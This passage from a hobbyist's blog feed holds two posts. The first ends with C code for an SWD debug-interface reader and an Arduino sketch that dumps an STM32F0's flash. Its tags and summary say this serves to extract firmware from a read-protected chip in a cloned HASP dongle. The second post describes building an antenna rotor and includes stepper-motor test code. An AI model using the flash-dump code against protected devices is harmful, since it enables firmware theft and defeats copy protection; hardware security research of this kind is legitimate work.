        <span class="k">case</span> <span class="mh">0x03u</span><span class="p">:</span>
            <span class="o">*</span><span class="n">header</span> <span class="o">|=</span> <span class="mh">0x18u</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>

        <span class="nl">default:</span>
        <span class="k">case</span> <span class="mh">0x00u</span><span class="p">:</span>

            <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="o">*</span><span class="n">header</span> <span class="o">|=</span> <span class="n">swdParity</span><span class="p">(</span><span class="n">header</span><span class="p">,</span> <span class="mi">7u</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">5u</span><span class="p">;</span>
    <span class="o">*</span><span class="n">header</span> <span class="o">|=</span> <span class="mh">0x01u</span><span class="p">;</span> <span class="cm">/* startbit */</span>
    <span class="o">*</span><span class="n">header</span> <span class="o">|=</span> <span class="mh">0x80u</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="n">swdStatus_t</span> <span class="nf">swdReadPacket</span><span class="p">(</span><span class="n">swdPortSelect_t</span> <span class="k">const</span> <span class="n">portSel</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">A32</span><span class="p">,</span> <span class="kt">uint32_t</span><span class="o">*</span> <span class="k">const</span> <span class="n">data</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">swdStatus_t</span> <span class="n">ret</span><span class="p">;</span>
    <span class="kt">uint8_t</span> <span class="n">header</span> <span class="o">=</span> <span class="mh">0x00u</span><span class="p">;</span>
    <span class="kt">uint8_t</span> <span class="n">rp</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x00u</span><span class="p">};</span>
    <span class="kt">uint8_t</span> <span class="n">resp</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0u</span><span class="p">};</span>
    <span class="kt">uint8_t</span> <span class="n">i</span><span class="p">;</span>

    <span class="n">swdBuildHeader</span><span class="p">(</span><span class="n">swdAccessDirectionRead</span><span class="p">,</span> <span class="n">portSel</span><span class="p">,</span> <span class="n">A32</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">header</span><span class="p">);</span>

    <span class="n">swdDatasend</span><span class="p">(</span><span class="o">&amp;</span><span class="n">header</span><span class="p">,</span> <span class="mi">8u</span><span class="p">);</span>
    <span class="n">swdDataIdle</span><span class="p">();</span>
    <span class="n">swdTurnaround</span><span class="p">();</span>
    <span class="n">swdDataRead</span><span class="p">(</span><span class="n">rp</span><span class="p">,</span> <span class="mi">3u</span><span class="p">);</span>

    <span class="n">swdDataRead</span><span class="p">(</span><span class="n">resp</span><span class="p">,</span> <span class="mi">33u</span><span class="p">);</span>

    <span class="n">swdDataPP</span><span class="p">();</span>

    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">N_READ_TURN</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">swdTurnaround</span><span class="p">();</span>
    <span class="p">}</span>

    <span class="o">*</span><span class="n">data</span> <span class="o">=</span> <span class="n">resp</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">|</span> <span class="p">(</span><span class="n">resp</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">8u</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">resp</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">16u</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">resp</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">24u</span><span class="p">);</span>

    <span class="n">ret</span> <span class="o">=</span> <span class="n">rp</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>

    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="n">swdStatus_t</span> <span class="nf">swdWritePacket</span><span class="p">(</span><span class="n">swdPortSelect_t</span> <span class="k">const</span> <span class="n">portSel</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">A32</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="k">const</span> <span class="n">data</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">swdStatus_t</span> <span class="n">ret</span><span class="p">;</span>
    <span class="kt">uint8_t</span> <span class="n">header</span> <span class="o">=</span> <span class="mh">0x00u</span><span class="p">;</span>
    <span class="kt">uint8_t</span> <span class="n">rp</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x00u</span><span class="p">};</span>
    <span class="kt">uint8_t</span> <span class="n">data1</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0u</span><span class="p">};</span>
    <span class="kt">uint8_t</span> <span class="n">i</span><span class="p">;</span>

    <span class="n">swdBuildHeader</span><span class="p">(</span><span class="n">swdAccessDirectionWrite</span><span class="p">,</span> <span class="n">portSel</span><span class="p">,</span> <span class="n">A32</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">header</span><span class="p">);</span>

    <span class="n">swdDatasend</span><span class="p">(</span><span class="o">&amp;</span><span class="n">header</span><span class="p">,</span> <span class="mi">8u</span><span class="p">);</span>
    <span class="n">MWAIT</span><span class="p">;</span>

    <span class="n">swdDataIdle</span><span class="p">();</span>
    <span class="n">MWAIT</span><span class="p">;</span>

    <span class="n">swdTurnaround</span><span class="p">();</span>

    <span class="n">swdDataRead</span><span class="p">(</span><span class="n">rp</span><span class="p">,</span> <span class="mi">3u</span><span class="p">);</span>

    <span class="n">swdDataIdle</span><span class="p">();</span>

    <span class="n">swdTurnaround</span><span class="p">();</span>
    <span class="n">swdDataPP</span><span class="p">();</span>

    <span class="n">data1</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">data</span> <span class="o">&amp;</span> <span class="mh">0xFFu</span><span class="p">;</span>
    <span class="n">data1</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span> <span class="o">&gt;&gt;</span> <span class="mi">8u</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFu</span><span class="p">;</span>
    <span class="n">data1</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span> <span class="o">&gt;&gt;</span> <span class="mi">16u</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFu</span><span class="p">;</span>
    <span class="n">data1</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span> <span class="o">&gt;&gt;</span> <span class="mi">24u</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFu</span><span class="p">;</span>
    <span class="n">data1</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="n">swdParity</span><span class="p">(</span><span class="n">data1</span><span class="p">,</span> <span class="mi">8u</span> <span class="o">*</span> <span class="mi">4u</span><span class="p">);</span>

    <span class="n">swdDatasend</span><span class="p">(</span><span class="n">data1</span><span class="p">,</span> <span class="mi">33u</span><span class="p">);</span>

    <span class="n">swdDataPP</span><span class="p">();</span>

    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">20u</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">swdTurnaround</span><span class="p">();</span>
    <span class="p">}</span>

    <span class="n">ret</span> <span class="o">=</span> <span class="n">rp</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>

    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">swdStatus_t</span> <span class="nf">swdReadIdcode</span><span class="p">(</span><span class="kt">uint32_t</span><span class="o">*</span> <span class="k">const</span> <span class="n">idCode</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">uint32_t</span> <span class="n">ret</span><span class="p">;</span>

    <span class="n">ret</span> <span class="o">=</span> <span class="n">swdReadPacket</span><span class="p">(</span><span class="n">swdPortSelectDP</span><span class="p">,</span> <span class="mh">0x00u</span><span class="p">,</span> <span class="n">idCode</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">swdStatus_t</span> <span class="nf">swdSelectAPnBank</span><span class="p">(</span><span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">ap</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">bank</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">swdStatus_t</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">swdStatusNone</span><span class="p">;</span>
    <span class="kt">uint32_t</span> <span class="n">data</span> <span class="o">=</span> <span class="mh">0x00000000u</span><span class="p">;</span>

    <span class="n">data</span> <span class="o">|=</span> <span class="p">(</span><span class="kt">uint32_t</span><span class="p">)(</span><span class="n">ap</span> <span class="o">&amp;</span> <span class="mh">0xFFu</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">24u</span><span class="p">;</span>
    <span class="n">data</span> <span class="o">|=</span> <span class="p">(</span><span class="kt">uint32_t</span><span class="p">)(</span><span class="n">bank</span> <span class="o">&amp;</span> <span class="mh">0x0Fu</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">0u</span><span class="p">;</span>

    <span class="cm">/* write to select register */</span>
    <span class="n">ret</span> <span class="o">|=</span> <span class="n">swdWritePacket</span><span class="p">(</span><span class="n">swdPortSelectDP</span><span class="p">,</span> <span class="mh">0x02u</span><span class="p">,</span> <span class="n">data</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="n">swdStatus_t</span> <span class="nf">swdReadAP0</span><span class="p">(</span><span class="kt">uint32_t</span><span class="o">*</span> <span class="k">const</span> <span class="n">data</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">swdStatus_t</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">swdStatusNone</span><span class="p">;</span>

    <span class="n">swdReadPacket</span><span class="p">(</span><span class="n">swdPortSelectAP</span><span class="p">,</span> <span class="mh">0x00u</span><span class="p">,</span> <span class="n">data</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">swdStatus_t</span> <span class="nf">swdSetAP32BitMode</span><span class="p">(</span><span class="kt">uint32_t</span><span class="o">*</span> <span class="k">const</span> <span class="n">data</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">swdStatus_t</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">swdStatusNone</span><span class="p">;</span>

    <span class="n">swdSelectAPnBank</span><span class="p">(</span><span class="mh">0x00u</span><span class="p">,</span> <span class="mh">0x00u</span><span class="p">);</span>

    <span class="kt">uint32_t</span> <span class="n">d</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span>

    <span class="n">ret</span> <span class="o">|=</span> <span class="n">swdReadAP0</span><span class="p">(</span><span class="o">&amp;</span><span class="n">d</span><span class="p">);</span>

    <span class="n">ret</span> <span class="o">|=</span> <span class="n">swdReadPacket</span><span class="p">(</span><span class="n">swdPortSelectDP</span><span class="p">,</span> <span class="mh">0x03u</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">d</span><span class="p">);</span>

    <span class="n">d</span> <span class="o">&amp;=</span> <span class="o">~</span><span class="p">(</span><span class="mh">0x07u</span><span class="p">);</span>
    <span class="n">d</span> <span class="o">|=</span> <span class="mh">0x02u</span><span class="p">;</span>

    <span class="n">ret</span> <span class="o">|=</span> <span class="n">swdWritePacket</span><span class="p">(</span><span class="n">swdPortSelectAP</span><span class="p">,</span> <span class="mh">0x00u</span><span class="p">,</span> <span class="n">d</span><span class="p">);</span>

    <span class="n">ret</span> <span class="o">|=</span> <span class="n">swdReadAP0</span><span class="p">(</span><span class="o">&amp;</span><span class="n">d</span><span class="p">);</span>
    <span class="n">ret</span> <span class="o">|=</span> <span class="n">swdReadPacket</span><span class="p">(</span><span class="n">swdPortSelectDP</span><span class="p">,</span> <span class="mh">0x03u</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">d</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">data</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="o">*</span><span class="n">data</span> <span class="o">=</span> <span class="n">d</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">swdStatus_t</span> <span class="nf">swdSelectAHBAP</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">swdStatus_t</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">swdSelectAPnBank</span><span class="p">(</span><span class="mh">0x00u</span><span class="p">,</span> <span class="mh">0x00u</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">swdStatus_t</span> <span class="nf">swdReadAHBAddr</span><span class="p">(</span><span class="kt">uint32_t</span> <span class="k">const</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">uint32_t</span><span class="o">*</span> <span class="k">const</span> <span class="n">data</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">swdStatus_t</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">swdStatusNone</span><span class="p">;</span>
    <span class="kt">uint32_t</span> <span class="n">d</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span>

    <span class="n">ret</span> <span class="o">|=</span> <span class="n">swdWritePacket</span><span class="p">(</span><span class="n">swdPortSelectAP</span><span class="p">,</span> <span class="mh">0x01u</span><span class="p">,</span> <span class="n">addr</span><span class="p">);</span>

    <span class="n">ret</span> <span class="o">|=</span> <span class="n">swdReadPacket</span><span class="p">(</span><span class="n">swdPortSelectAP</span><span class="p">,</span> <span class="mh">0x03u</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">d</span><span class="p">);</span>
    <span class="n">ret</span> <span class="o">|=</span> <span class="n">swdReadPacket</span><span class="p">(</span><span class="n">swdPortSelectDP</span><span class="p">,</span> <span class="mh">0x03u</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">d</span><span class="p">);</span>

    <span class="o">*</span><span class="n">data</span> <span class="o">=</span> <span class="n">d</span><span class="p">;</span>

    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">swdStatus_t</span> <span class="nf">swdEnableDebugIF</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">swdStatus_t</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">swdStatusNone</span><span class="p">;</span>

    <span class="n">ret</span> <span class="o">|=</span> <span class="n">swdWritePacket</span><span class="p">(</span><span class="n">swdPortSelectDP</span><span class="p">,</span> <span class="mh">0x01u</span><span class="p">,</span> <span class="mh">0x50000000u</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">swdStatus_t</span> <span class="nf">swdInit</span><span class="p">(</span><span class="kt">uint32_t</span><span class="o">*</span> <span class="k">const</span> <span class="n">idcode</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">swdStatus_t</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">swdStatusNone</span><span class="p">;</span>

    <span class="n">swdReset</span><span class="p">();</span>
    <span class="n">ret</span> <span class="o">|=</span> <span class="n">swdReadIdcode</span><span class="p">(</span><span class="n">idcode</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="maincpp">main.cpp</h3>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*
 * Copyright (C) 2017 Obermaier Johannes
 * Copyright (C) 2022 Lucas Teske
 *
 * This Source Code Form is subject to the terms of the MIT License.
 * If a copy of the MIT License was not distributed with this file,
 * you can obtain one at https://opensource.org/licenses/MIT
 */</span>

<span class="cp">#include</span> <span class="cpf">&lt;Arduino.h&gt;</span><span class="cp">
</span>
<span class="k">extern</span> <span class="s">"C"</span> <span class="p">{</span>
    <span class="cp">#include</span> <span class="cpf">"main.h"</span><span class="cp">
</span>    <span class="cp">#include</span> <span class="cpf">"reader.h"</span><span class="cp">
</span><span class="p">}</span>

<span class="c1">// STM32 target flash memory size in bytes</span>
<span class="kt">uint32_t</span> <span class="n">size</span> <span class="o">=</span> <span class="mi">32768</span><span class="p">;</span>

<span class="c1">// Usually the STM32F0x starts here.</span>
<span class="c1">// If you're trying to dump another series check the datasheet.</span>
<span class="kt">uint32_t</span> <span class="n">flashAddress</span> <span class="o">=</span> <span class="mh">0x08000000</span><span class="p">;</span>

<span class="kt">void</span> <span class="nf">setup</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">swdStatus_t</span> <span class="n">status</span><span class="p">;</span>
    <span class="n">Serial</span><span class="p">.</span><span class="n">begin</span><span class="p">(</span><span class="mi">115200</span><span class="p">);</span>

    <span class="n">pinMode</span><span class="p">(</span><span class="n">TARGET_RESET_Pin</span><span class="p">,</span> <span class="n">OUTPUT</span><span class="p">);</span>
    <span class="n">pinMode</span><span class="p">(</span><span class="n">TARGET_PWR_Pin</span><span class="p">,</span> <span class="n">OUTPUT</span><span class="p">);</span>
    <span class="n">pinMode</span><span class="p">(</span><span class="n">SWDIO_Pin</span><span class="p">,</span> <span class="n">OUTPUT</span><span class="p">);</span>
    <span class="n">pinMode</span><span class="p">(</span><span class="n">SWCLK_Pin</span><span class="p">,</span> <span class="n">OUTPUT</span><span class="p">);</span>

    <span class="n">targetInit</span><span class="p">();</span>
    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">LED1_Pin</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
    <span class="k">while</span><span class="p">(</span><span class="o">!</span><span class="n">Serial</span><span class="p">.</span><span class="n">available</span><span class="p">())</span> <span class="p">{</span>
        <span class="n">delay</span><span class="p">(</span><span class="mi">1000</span><span class="p">);</span>
        <span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="s">"Send anything to start..."</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="s">"Starting"</span><span class="p">);</span>

    <span class="kt">uint32_t</span> <span class="n">flashData</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">uint32_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">size</span><span class="p">;</span> <span class="n">i</span><span class="o">+=</span><span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">flashData</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">status</span> <span class="o">=</span> <span class="n">extractFlashData</span><span class="p">(</span><span class="n">flashAddress</span> <span class="o">+</span> <span class="n">i</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">flashData</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">status</span> <span class="o">!=</span> <span class="n">swdStatusOk</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">Serial</span><span class="p">.</span><span class="n">printf</span><span class="p">(</span><span class="s">"Error reading: %d</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">status</span><span class="p">);</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">Serial</span><span class="p">.</span><span class="n">printf</span><span class="p">(</span><span class="s">"%08x: %08x</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">flashAddress</span> <span class="o">+</span> <span class="n">i</span><span class="p">,</span> <span class="n">flashData</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="s">"DONE"</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">loop</span><span class="p">()</span> <span class="p">{}</span>
</code></pre></div></div>]]></content><author><name>Lucas Teske</name></author><category term="Reverse Engineering" /><category term="Hardware Hacking" /><category term="Protected Firmware" /><category term="Hardware Hacking" /><category term="RE" /><category term="Reverse Engineering" /><category term="STM32" /><category term="Patreon" /><category term="MCU" /><summary type="html"><![CDATA[In the process of my hobby hardware hacking, I encountered a Chinese clone of a HASP HL dongle equipped with a STM32F042G6U6 processor. My intention was to clone it, and during my exploration, I discovered four pins from the SWD debug interface located at the bottom of the PCB. I soldered a 4-pin header to these pins for ease of access.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://lucasteske.dev/assets/posts/patreon/Pasted%20image%2020230124035811.png" /><media:content medium="image" url="https://lucasteske.dev/assets/posts/patreon/Pasted%20image%2020230124035811.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Antenna Rotor - Part 2</title><link href="https://lucasteske.dev/2021/04/rotor-antenna-parte-2" rel="alternate" type="text/html" title="Antenna Rotor - Part 2" /><published>2021-04-01T02:23:00-03:00</published><updated>2021-04-01T02:23:00-03:00</updated><id>https://lucasteske.dev/2021/04/rotor-antenna-parte-2</id><content type="html" xml:base="https://lucasteske.dev/2021/04/rotor-antenna-parte-2"><![CDATA[<p>Continuing the tracker project, I managed to make some significant progress. As Demilson (PY2UEP) had cut the original motors, I did the same. The azimuth motor was too rusted and I eventually destroyed one of the coils (which I wanted to salvage the wire), but in the end the shaft went out.</p>

<hr />

<p>After removing the shaft, I broke the magnet with a hammer until there was any piece left. That way, the only thing that would be left there is the shaft and the hexagon magnet support.</p>

<p><img src="/assets/posts/tracker-mount-2/azimuth-motor-shaft.jpg" alt="Hexagon Magnet Support 1" />
<img src="/assets/posts/tracker-mount-2/azimuth-motor-shaft2.jpg" alt="Hexagon Magnet Support 2" />
<img src="/assets/posts/tracker-mount-2/azimuth-motor-shaft3.jpg" alt="Hexagon Magnet Support 3" /><em>Motor shaft showing the hexagon support</em></p>

<p>For the elevation motor, I made a cut in a circular mark around the exit of the shaft. That way I could use the same support for coupling with the reduction gears.</p>

<p><img src="/assets/posts/tracker-mount-2/elevation-shaft-support.jpg" alt="&quot;lid&quot; of the elevation motor after cut" /><em>“lid” of the elevation motor after cut</em>
<img src="/assets/posts/tracker-mount-2/elevation-shaft-support-with-reduction.jpg" alt="Lid + Reduction Gears" /><em>Lid + Reduction Gears</em>
<img src="/assets/posts/tracker-mount-2/elevation-motor-parts2.jpg" alt="Motor Pieces" /><em>Motor Pieces</em></p>

<p>For the shaft, it was nescessary to reduce its size and made a bevel so I could fit it better in a 3D Printed part. To do so, I use two plywood pieces to hold the shaft while me and my father cut it. For the bevel, we used a grinder.</p>

<p><img src="/assets/posts/tracker-mount-2/elevation-shaft-cut.jpg" alt="Plywood and cutted shaft" /><em>Plywood and cutted shaft</em>
<img src="/assets/posts/tracker-mount-2/elevation-shaft-support-with-shaft.jpg" alt="Cutted Shaft on motor head" /><em>Cutted Shaft on motor head</em></p>

<p>With that, I could then start the 3D Drawings for the adapters.</p>

<h2 id="3d-prints">3D Prints</h2>

<p>After A LOT of trial and error, I managed to make good fittings between the shafts. But then I realized a problem: The space for the azimuth axis was <strong>extremelly</strong> limited, in the way that my 40 mm NEMA17 motors were too big for it.</p>

<p><img src="/assets/posts/tracker-mount-2/try-azimuth-44adapter.jpg" alt="Azimuth Adapter" />
<img src="/assets/posts/tracker-mount-2/try-azimuth-44adapter-place.jpg" alt="Azimuth Adapter" /><em>Azimuth Adapter</em></p>

<p>Then I had to buy some “slim” motors to use in that place. I got a bit concerned with the final torque, but my attempts to make gears and other stuff were all failed. The motors I bought in Aliexpress (see links in the end of this post)</p>

<p>While the motor wasn’t arriving, I started optimizing the adapters to be the shortest as possible, saving all space I could. I use <a href="https://www.freecadweb.org/">FreeCAD</a> for being free and where I can do faster / better drawings. But don’t assume I’m a 3D Designer, because I’m not. My parts are only “functional”.</p>

<p><img src="/assets/posts/tracker-mount-2/azimuth-shaft-adapter.jpg" alt="Azimuth Shaft Adapter" /><em>Azimuth Shaft Adapter</em>
<img src="/assets/posts/tracker-mount-2/azimuth-support.jpg" alt="Azimuth Support" /><em>Azimuth Support</em>
<img src="/assets/posts/tracker-mount-2/elevation-shaft-adapter.jpg" alt="Elevation Shaft Adapter" /><em>Elevation Shaft Adapter</em>
<img src="/assets/posts/tracker-mount-2/elevation-motor-adapter.jpg" alt="Elevation Adapter" /><em>Elevation Adapter</em>
<img src="/assets/posts/tracker-mount-2/exploded-elevation-shaft.jpg" alt="" /></p>

<p>And the first axis to work was the elevation. To do so I used 40 mm NEMA17 motors (link in end of this post), which came with a closed-loop magnetic encoder driver. But in the end I went to use a TMC2209 to control instead the board that came in because it was easier and quieter.</p>

<p><img src="https://www.youtube.com/watch?v=cfUtCqb3oxA" alt="" />
<img src="https://www.youtube.com/watch?v=ENTpTZaiXl4" alt="" /></p>

<p>After the new azimuth motors arrived, I just tried to fit everything. And it did! se ia caber. E coube!</p>

<p><img src="/assets/posts/tracker-mount-2/assembled-azimuth-support.jpg" alt="Azimuth" />
<img src="/assets/posts/tracker-mount-2/azimuth-motor-inplace.jpg" alt="Azimuth Motor in place" /></p>

<p>And also working!</p>

<p><img src="https://www.youtube.com/watch?v=-4U-ofHaF0E" alt="" /></p>

<p>After everything was working, I did some tests to check what was the final resolution and reduction for both axis. To do so, I used the following code with an ESP32 to control the TMC2209 drivers, and for angle measurement I used my phone attached to the elevation base.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;TMCStepper.h&gt;</span><span class="cp">
</span>
<span class="cp">#define STEP_PIN         12 // Step
#define EN_PIN           23 // Enable
</span>
<span class="cp">#define SERIAL_PORT Serial2 // TMC2208/TMC2224 HardwareSerial port
#define DRIVER_ADDRESS 0b00 // TMC2209 Driver address according to MS1 and MS2
</span>
<span class="cp">#define R_SENSE 0.11f 
</span>
<span class="n">TMC2209Stepper</span> <span class="nf">driver</span><span class="p">(</span><span class="o">&amp;</span><span class="n">SERIAL_PORT</span><span class="p">,</span> <span class="n">R_SENSE</span><span class="p">,</span> <span class="n">DRIVER_ADDRESS</span><span class="p">);</span>

<span class="kt">void</span> <span class="nf">setup</span><span class="p">()</span> <span class="p">{</span>
  <span class="n">pinMode</span><span class="p">(</span><span class="n">STEP_PIN</span><span class="p">,</span> <span class="n">OUTPUT</span><span class="p">);</span>
  <span class="n">pinMode</span><span class="p">(</span><span class="n">EN_PIN</span><span class="p">,</span> <span class="n">OUTPUT</span><span class="p">);</span>
  <span class="n">digitalWrite</span><span class="p">(</span><span class="n">EN_PIN</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
  
  <span class="n">SERIAL_PORT</span><span class="p">.</span><span class="n">begin</span><span class="p">(</span><span class="mi">115200</span><span class="p">);</span>      <span class="c1">// HW UART drivers</span>
  <span class="n">Serial</span><span class="p">.</span><span class="n">begin</span><span class="p">(</span><span class="mi">115200</span><span class="p">);</span>

  <span class="n">driver</span><span class="p">.</span><span class="n">begin</span><span class="p">();</span>                 <span class="c1">// UART: Init SW UART (if selected) with default 115200 baudrate</span>
  <span class="n">driver</span><span class="p">.</span><span class="n">toff</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>                <span class="c1">// Enables driver in software</span>
  <span class="n">driver</span><span class="p">.</span><span class="n">rms_current</span><span class="p">(</span><span class="mi">1000</span><span class="p">);</span>       <span class="c1">// Set motor RMS current</span>
  <span class="n">driver</span><span class="p">.</span><span class="n">microsteps</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>           <span class="c1">// Set microsteps to 1/16th</span>

  <span class="n">driver</span><span class="p">.</span><span class="n">en_spreadCycle</span><span class="p">(</span><span class="nb">false</span><span class="p">);</span>    <span class="c1">// Toggle spreadCycle on TMC2208/2209/2224</span>
  <span class="n">driver</span><span class="p">.</span><span class="n">pwm_autoscale</span><span class="p">(</span><span class="nb">true</span><span class="p">);</span>      <span class="c1">// Needed for stealthChop</span>

  <span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="s">"OK"</span><span class="p">);</span>
  <span class="n">digitalWrite</span><span class="p">(</span><span class="n">EN_PIN</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">bool</span> <span class="n">shaft</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>

<span class="kt">void</span> <span class="nf">loop</span><span class="p">()</span> <span class="p">{</span>
<span class="c1">//  Serial.println("TURN");</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">Serial</span><span class="p">.</span><span class="n">available</span><span class="p">()</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">z</span> <span class="o">=</span> <span class="n">Serial</span><span class="p">.</span><span class="n">read</span><span class="p">();</span>
